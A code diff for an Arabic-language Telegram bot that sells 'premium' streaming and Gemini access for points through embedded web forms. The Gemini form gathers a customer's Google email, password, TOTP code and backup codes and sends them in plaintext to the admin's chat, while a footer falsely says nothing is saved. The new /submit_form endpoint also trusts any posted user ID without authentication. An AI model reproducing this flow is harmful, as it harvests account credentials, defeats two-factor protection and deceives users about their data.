@@ -1,7 +1,7 @@
 import os
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
-from flask import Flask, request
+from flask import Flask, request, jsonify
 from pymongo import MongoClient
 import datetime
 
@@ -107,7 +107,7 @@ def add_points(message):
     else:
         bot.send_message(message.chat.id, "⛔️ عذراً، هذا الأمر للإدارة فقط.")
 
-# --- التعامل مع أوامر الكول باك (زر الرد من الأدمن) ---
+# --- زر الرد من الأدمن ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
 def handle_reply_button(call):
     if str(call.from_user.id) == str(ADMIN_ID):
@@ -134,12 +134,10 @@ def handle_text(message):
             bot.send_message(user_id, f"✅ تم إرسال رسالتك للعميل بنجاح.")
         except:
             bot.send_message(user_id, "❌ فشل الإرسال، يبدو أن العميل قام بإيقاف البوت.")
-        
         del admin_states[user_id]
         return
 
     user = users_collection.find_one({"user_id": user_id})
-
     if not user:
         bot.send_message(user_id, "⚠️ الرجاء إرسال أمر /start أولاً لتسجيل حسابك.")
         return
@@ -147,7 +145,6 @@ def handle_text(message):
     if text == BTN_DAILY:
         today_str = datetime.datetime.now().strftime("%Y-%m-%d")
         yesterday_str = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y-%m-%d")
-        
         last_date = user.get("last_collected_date")
         streak = user.get("streak", 0)
 
@@ -181,50 +178,56 @@ def handle_text(message):
     elif text == BTN_YT:
         points = user.get("points", 0)
         if points >= 15:
+            msg = bot.send_message(user_id, "📺 <b>يوتيوب بريميوم</b>\nاستمتع بمشاهدة بدون إعلانات.\n\n💎 <b>التكلفة:</b> 15 نقطة.")
             markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/youtube.html?uid={user_id}&pts={points}")))
-            bot.send_message(user_id, "📺 <b>يوتيوب بريميوم</b>\nاستمتع بمشاهدة بدون إعلانات.\n\n💎 <b>التكلفة:</b> 15 نقطة.", reply_markup=markup)
+            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/youtube.html?uid={user_id}&msg_id={msg.message_id}")))
+            bot.edit_message_reply_markup(user_id, msg.message_id, reply_markup=markup)
         else:
             bot.send_message(user_id, f"📺 <b>يوتيوب بريميوم</b>\n\n😔 <b>عذراً، رصيدك غير كافٍ.</b>\nرصيدك: {points} نقطة.")
 
     elif text == BTN_SPOTIFY:
         points = user.get("points", 0)
         if points >= 15:
+            msg = bot.send_message(user_id, "🎵 <b>سبوتيفاي بريميوم</b>\nاستمع للموسيقى بأعلى جودة.\n\n💎 <b>التكلفة:</b> 15 نقطة.")
             markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/spotify.html?uid={user_id}&pts={points}")))
-            bot.send_message(user_id, "🎵 <b>سبوتيفاي بريميوم</b>\nاستمع للموسيقى بأعلى جودة.\n\n💎 <b>التكلفة:</b> 15 نقطة.", reply_markup=markup)
+            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/spotify.html?uid={user_id}&msg_id={msg.message_id}")))
+            bot.edit_message_reply_markup(user_id, msg.message_id, reply_markup=markup)
         else:
             bot.send_message(user_id, f"🎵 <b>سبوتيفاي بريميوم</b>\n\n😔 <b>عذراً، رصيدك غير كافٍ.</b>\nرصيدك: {points} نقطة.")
 
     elif text == BTN_GEMINI:
         points = user.get("points", 0)
         if points >= 15:
+            msg = bot.send_message(user_id, "✨ <b>جيميناي برو</b>\nالذكاء الاصطناعي الأقوى.\n\n💎 <b>التكلفة:</b> 15 نقطة.")
             markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/gemini.html?uid={user_id}&pts={points}")))
-            bot.send_message(user_id, "✨ <b>جيميناي برو</b>\nالذكاء الاصطناعي الأقوى.\n\n💎 <b>التكلفة:</b> 15 نقطة.", reply_markup=markup)
+            markup.add(InlineKeyboardButton("📝 فتح النموذج للطلب", web_app=WebAppInfo(url=f"https://mybot-1-d6wr.onrender.com/gemini.html?uid={user_id}&pts={points}&msg_id={msg.message_id}")))
+            bot.edit_message_reply_markup(user_id, msg.message_id, reply_markup=markup)
         else:
             bot.send_message(user_id, f"✨ <b>جيميناي برو</b>\n\n😔 <b>عذراً، رصيدك غير كافٍ.</b>\nرصيدك: {points} نقطة.")
 
     elif text in [BTN_MAIN, BTN_HELP, BTN_GUIDE, BTN_DEPOSIT]:
         bot.send_message(user_id, "⏳ سيتم إضافة المحتوى قريباً...")
 
-# --- استقبال البيانات من النماذج ---
-@bot.message_handler(content_types=['web_app_data'])
-def handle_web_app_data(message):
-    user_id = message.from_user.id
-    user_name = message.from_user.first_name
-    username = f"@{message.from_user.username}" if message.from_user.username else "بدون يوزر"
-    data = message.web_app_data.data 
+# ==========================================
+# --- نظام API لاستقبال بيانات النماذج (الحل الجذري) ---
+# ==========================================
+@app.route('/submit_form', methods=['POST'])
+def submit_form():
+    data = request.json
+    user_id = int(data.get('uid'))
+    msg_id = int(data.get('msg_id'))
+    form_data = data.get('dataString')
 
     user = users_collection.find_one({"user_id": user_id})
     if user and user.get("points", 0) >= 15:
-        # خصم النقاط وتحديث قاعدة البيانات
+        # 1. خصم النقاط
         users_collection.update_one({"user_id": user_id}, {"$inc": {"points": -15}})
         new_points = user.get("points", 0) - 15
+        user_name = user.get("first_name", "عميل")
         
-        # إرسال الطلب للأدمن مع زر الرد المباشر
+        # 2. إرسال الطلب للأدمن
         if ADMIN_ID:
-            admin_msg = f"🔔 <b>طلب جديد استلمناه للتو!</b>\n\n👤 العميل: {user_name} ({username})\n🆔 رقم العميل: <code>{user_id}</code>\n\n📋 <b>البيانات المرسلة:</b>\n{data}"
+            admin_msg = f"🔔 <b>طلب جديد استلمناه للتو!</b>\n\n👤 العميل: {user_name}\n🆔 رقم العميل: <code>{user_id}</code>\n\n📋 <b>البيانات المرسلة:</b>\n{form_data}"
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("✍️ رد على العميل", callback_data=f"reply_{user_id}"))
             try:
@@ -232,18 +235,23 @@ def handle_web_app_data(message):
             except:
                 pass
         
-        # إخفاء رسالة فتح النموذج السابقة من شات العميل
+        # 3. حذف رسالة زر فتح النموذج
         try:
-            bot.delete_message(message.chat.id, message.message_id - 1) 
+            bot.delete_message(user_id, msg_id) 
         except:
             pass
             
+        # 4. إرسال رسالة التأكيد الأنيقة
         success_msg = f"🎉 <b>طلبك قيد التنفيذ، الرجاء الانتظار!</b>\n\n⭐ <b>رصيدك المتبقي:</b> {new_points} نقطة.\n\n<a href='https://t.me/bdallhshay7'>💬 للتواصل والاستفسار اضغط هنا</a>"
-        bot.send_message(user_id, success_msg, reply_markup=main_keyboard())
+        bot.send_message(user_id, success_msg)
+        
+        return jsonify({"status": "success"}), 200
+    
+    return jsonify({"status": "error"}), 400
 
 
 # ==========================================
-# --- أكواد ونماذج HTML المدمجة (تصاميم جديدة) ---
+# --- أكواد ونماذج HTML المدمجة (متصلة بالـ API) ---
 # ==========================================
 
 @app.route('/youtube.html')
@@ -263,6 +271,7 @@ def youtube_form():
             input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
             input:focus { border-color: #FF0000; outline: none; }
             button { background-color: #FF0000; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(255,0,0,0.2); }
+            button:disabled { background-color: #ccc; cursor: not-allowed; }
         </style>
     </head>
     <body>
@@ -270,15 +279,35 @@ def youtube_form():
             <h2>يوتيوب بريميوم 📺</h2>
             <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
             <input type="url" id="link" placeholder="https://..." required>
-            <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+            <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
         </div>
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
+            const urlParams = new URLSearchParams(window.location.search);
+            const uid = urlParams.get('uid');
+            const msg_id = urlParams.get('msg_id');
+
             function sendData() {
                 let link = document.getElementById('link').value;
                 if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
-                tg.sendData("الخدمة: يوتيوب بريميوم \\nالرابط: " + link);
+                
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').innerText = "جاري الإرسال...";
+
+                let dataString = "الخدمة: يوتيوب بريميوم \\nالرابط: " + link;
+                
+                fetch('/submit_form', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
+                }).then(response => {
+                    tg.close();
+                }).catch(err => {
+                    alert("حدث خطأ أثناء الإرسال.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
+                });
             }
         </script>
     </body>
@@ -302,6 +331,7 @@ def spotify_form():
             input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; text-align: left; direction: ltr; }
             input:focus { border-color: #1DB954; outline: none; }
             button { background-color: #1DB954; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(29,185,84,0.2); }
+            button:disabled { background-color: #ccc; cursor: not-allowed; }
         </style>
     </head>
     <body>
@@ -309,15 +339,35 @@ def spotify_form():
             <h2>سبوتيفاي بريميوم 🎵</h2>
             <p>يرجى لصق رابط التحقق والدفع الخاص بك في الأسفل:</p>
             <input type="url" id="link" placeholder="https://..." required>
-            <button onclick="sendData()">تأكيد وطلب التفعيل</button>
+            <button id="submitBtn" onclick="sendData()">تأكيد وطلب التفعيل</button>
         </div>
         <script>
             let tg = window.Telegram.WebApp;
             tg.expand();
+            const urlParams = new URLSearchParams(window.location.search);
+            const uid = urlParams.get('uid');
+            const msg_id = urlParams.get('msg_id');
+
             function sendData() {
                 let link = document.getElementById('link').value;
                 if(!link) { alert("⚠️ الرجاء إدخال الرابط أولاً!"); return; }
-                tg.sendData("الخدمة: سبوتيفاي بريميوم \\nالرابط: " + link);
+                
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').innerText = "جاري الإرسال...";
+
+                let dataString = "الخدمة: سبوتيفاي بريميوم \\nالرابط: " + link;
+                
+                fetch('/submit_form', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
+                }).then(response => {
+                    tg.close();
+                }).catch(err => {
+                    alert("حدث خطأ أثناء الإرسال.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerText = "تأكيد وطلب التفعيل";
+                });
             }
         </script>
     </body>
@@ -349,6 +399,7 @@ def gemini_form():
             .toggle-password { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888; font-size: 18px;}
             .helper-text { font-size: 11px; color: #888; margin-top: 8px; display: block; line-height: 1.4;}
             .submit-btn { background-color: #0f9d58; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px;}
+            .submit-btn:disabled { background-color: #ccc; cursor: not-allowed; }
             .footer-note { text-align: center; font-size: 11px; color: #aaa; margin-top: 20px; }
         </style>
     </head>
@@ -388,7 +439,7 @@ def gemini_form():
                 <span class="helper-text">ℹ️ رمز واحد في كل سطر، 2-3 رموز مطلوبة؛ يتكون كل رمز من 8 أرقام بالضبط.</span>
             </div>
             
-            <button class="submit-btn" onclick="sendData()">تأكيد وتفعيل ⚡</button>
+            <button id="submitBtn" class="submit-btn" onclick="sendData()">تأكيد وتفعيل ⚡</button>
             <div class="footer-note">يتم استخدام المعلومات فقط لهذا التنشيط ولا يتم حفظها.</div>
         </div>
         
@@ -396,9 +447,11 @@ def gemini_form():
             let tg = window.Telegram.WebApp;
             tg.expand();
             
-            // استخراج النقاط من الرابط وعرضها
             const urlParams = new URLSearchParams(window.location.search);
+            const uid = urlParams.get('uid');
+            const msg_id = urlParams.get('msg_id');
             const points = urlParams.get('pts');
+            
             if(points) {
                 document.getElementById('userPoints').innerText = points;
             }
@@ -416,19 +469,31 @@ def gemini_form():
                 
                 if(!email || !pwd) { alert("⚠️ الرجاء إدخال الإيميل وكلمة المرور الأساسية!"); return; }
                 
-                let dataString = "الخدمة: جيميناي برو (أتمتة البكسل)\\n" + 
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').innerHTML = "جاري الإرسال... ⏳";
+
+                let dataString = "الخدمة: جيميناي برو (أتمتة الباقات)\\n" + 
                                  "الإيميل: " + email + "\\n" +
                                  "كلمة المرور: " + pwd + "\\n" +
                                  "TOTP: " + totp + "\\n" +
                                  "رموز الاحتياط: " + backup;
                 
-                tg.sendData(dataString);
+                fetch('/submit_form', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({uid: uid, msg_id: msg_id, dataString: dataString})
+                }).then(response => {
+                    tg.close();
+                }).catch(err => {
+                    alert("حدث خطأ أثناء الإرسال.");
+                    document.getElementById('submitBtn').disabled = false;
+                    document.getElementById('submitBtn').innerHTML = "تأكيد وتفعيل ⚡";
+                });
             }
         </script>
     </body>
     </html>
     ''', 200
-
 
 # --- إعدادات Webhook لسيرفر Render ---
 @app.route('/' + BOT_TOKEN, methods=['POST'])
